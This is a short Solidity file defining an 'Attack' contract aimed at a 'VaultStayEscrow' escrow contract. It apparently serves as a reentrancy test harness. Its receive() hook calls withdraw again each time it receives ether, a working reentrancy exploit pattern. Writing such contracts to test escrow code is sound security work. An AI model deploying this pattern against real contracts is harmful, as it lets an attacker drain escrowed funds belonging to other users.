// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VaultStayEscrow.sol";

contract Attack {
    VaultStayEscrow public target;
    uint256 public rentalId;

    constructor(address _target) {
        target = VaultStayEscrow(_target);
    }

    function attackFund(uint256 _id) external payable {
        rentalId = _id;
        target.fundRental{value: msg.value}(_id);
    }

    function attackWithdraw() external {
        target.withdraw(address(0));
    }

    function initiateCancel() external {
        target.cancelRental(rentalId);
    }

    receive() external payable {
        // Attempt reentrancy unconditionally
        target.withdraw(address(0));
    }
}
